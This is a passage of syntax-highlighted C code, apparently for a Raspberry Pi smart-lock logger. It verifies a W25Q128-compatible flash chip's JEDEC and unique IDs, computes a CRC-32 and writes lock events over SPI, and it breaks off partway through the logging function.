</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdbool.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;wiringPiSPI.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;W25Q128.h&#34; // Our custom chip is compatible with the original W25Q128XX design</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define SPI_CHANNEL 0 </span><span class="c1">// /dev/spidev0.0
</span></span></span><span class="line"><span class="cl"><span class="c1">//#define SPI_CHANNEL 1 // /dev/spidev0.1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define CRC_SIZE 4 </span><span class="c1">// Size of the CRC data in bytes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define KEY_SIZE 12 </span><span class="c1">// Size of the key
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// SmartLockEvent structure definition
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">timestamp</span><span class="p">;</span>   <span class="c1">// Timestamp of the event
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint8_t</span> <span class="n">eventType</span><span class="p">;</span>    <span class="c1">// Numeric code for type of event // 0 to 255 (0xFF)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint16_t</span> <span class="n">userId</span><span class="p">;</span>      <span class="c1">// Numeric user identifier // 0 t0 65535 (0xFFFF)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint8_t</span> <span class="n">method</span><span class="p">;</span>       <span class="c1">// Numeric code for unlock method
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint8_t</span> <span class="n">status</span><span class="p">;</span>       <span class="c1">// Numeric code for status (success, failure)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span> <span class="n">SmartLockEvent</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Function Prototypes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">log_event</span><span class="p">(</span><span class="k">const</span> <span class="n">SmartLockEvent</span> <span class="n">event</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">sector</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">address</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kt">uint32_t</span> <span class="nf">calculateCRC32</span><span class="p">(</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">length</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">write_to_flash</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">sector</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">address</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">length</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// CRC-32 calculation function
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">uint32_t</span> <span class="nf">calculateCRC32</span><span class="p">(</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">crc</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">crc</span> <span class="o">^=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">crc</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">crc</span> <span class="o">=</span> <span class="p">(</span><span class="n">crc</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xEDB88320</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span>
</span></span><span class="line"><span class="cl">                <span class="n">crc</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">~</span><span class="n">crc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">bool</span> <span class="nf">verify_flashMemory</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint8_t</span> <span class="n">jedc</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span> 
</span></span><span class="line"><span class="cl">    <span class="kt">uint8_t</span> <span class="n">uid</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>     
</span></span><span class="line"><span class="cl">    <span class="kt">uint8_t</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>     
</span></span><span class="line"><span class="cl">    <span class="kt">uint8_t</span> <span class="n">wdata</span><span class="p">[</span><span class="mi">26</span><span class="p">];</span>    
</span></span><span class="line"><span class="cl">    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">    <span class="kt">uint16_t</span> <span class="n">n</span><span class="p">;</span>    
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">bool</span> <span class="n">jedecid_match</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span> <span class="c1">// Assume true, prove false
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">bool</span> <span class="n">uid_match</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span> <span class="c1">// Assume true, prove false
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// JEDEC ID to verify against 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint8_t</span> <span class="n">expectedJedec</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// UID to verify against 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint8_t</span> <span class="n">expectedUID</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xb4</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// SPI channel 0 at 2MHz.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// Start SPI channel 0 with 2MHz
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nf">wiringPiSPISetup</span><span class="p">(</span><span class="n">SPI_CHANNEL</span><span class="p">,</span> <span class="mi">2000000</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;SPISetup failed:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Start Flash Memory
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">W25Q128_begin</span><span class="p">(</span><span class="n">SPI_CHANNEL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// JEDEC ID Get
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//W25Q128_readManufacturer(buf);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">W25Q128_readManufacturer</span><span class="p">(</span><span class="n">jedc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;JEDEC ID : &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%x &#34;</span><span class="p">,</span><span class="n">jedc</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// Iterate over the array and compare elements
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">jedc</span><span class="p">)</span><span class="o">/</span><span class="k">sizeof</span><span class="p">(</span><span class="n">jedc</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">jedc</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="n">expectedJedec</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">jedecid_match</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span> <span class="c1">// Set match to false if any element doesn&#39;t match
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">break</span><span class="p">;</span> <span class="c1">// No need to check further if a mismatch is found
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">jedecid_match</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;JEDEC ID verified successfully.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;JEDEC ID does not match.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Unique ID
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// Unique ID Get
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">W25Q128_readUniqieID</span><span class="p">(</span><span class="n">uid</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Unique ID : &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%x &#34;</span><span class="p">,</span><span class="n">uid</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">    <span class="c1">// Iterate over the array and compare elements
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">uid</span><span class="p">)</span><span class="o">/</span><span class="k">sizeof</span><span class="p">(</span><span class="n">uid</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">uid</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="n">expectedUID</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">uid_match</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span> <span class="c1">// Set match to false if any element doesn&#39;t match
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">break</span><span class="p">;</span> <span class="c1">// No need to check further if a mismatch is found
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">uid_match</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;UID verified successfully.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;UID does not match.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">// Implementations
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">log_event</span><span class="p">(</span><span class="k">const</span> <span class="n">SmartLockEvent</span> <span class="n">event</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">sector</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">address</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">bool</span> <span class="n">memory_verified</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint16_t</span> <span class="n">n</span><span class="p">;</span>  
</span></span><span class="line"><span class="cl">    <span class="kt">uint8_t</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">memory_verified</span> <span class="o">=</span> <span class="nf">verify_flashMemory</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">memory_verified</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">     <span class="c1">// Start Flash Memory
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">W25Q128_begin</span><span class="p">(</span><span class="n">SPI_CHANNEL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Erase data by Sector
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;ERASE SECTOR!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">n</span> <span class="o">=</span> <span class="nf">W25Q128_eraseSector</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Erase Sector(0): n=%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">256</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">n</span> <span class="o">=</span>  <span class="nf">W25Q128_read</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">       
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">uint8_t</span> <span class="n">buffer</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="n">SmartLockEvent</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint32_t</span><span class="p">)];</span> <span class="c1">// Buffer for event and CRC
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint32_t</span> <span class="n">crc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">SmartLockEvent</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint32_t</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Serialize the event
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">memcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">SmartLockEvent</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Calculate CRC for the serialized event
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">crc</span> <span class="o">=</span> <span class="nf">calculateCRC32</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">SmartLockEvent</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Append CRC to the buffer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">memcpy</span><span class="p">(</span><span class="n">buffer</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">SmartLockEvent</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">crc</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">crc</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Print the SmartLockEvent for debugging
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;SmartLockEvent:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Timestamp: %u</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">event</span><span class="p">.</span><span class="n">timestamp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;EventType: %u</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">event</span><span class="p">.</span><span class="n">eventType</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;UserId: %u</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">event</span><span class="p">.</span><span class="n">userId</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Method: %u</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">event</span><span class="p">.</span><span class="n">method</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Status: %u</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">event</span><span class="p">.</span><span class="n">status</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
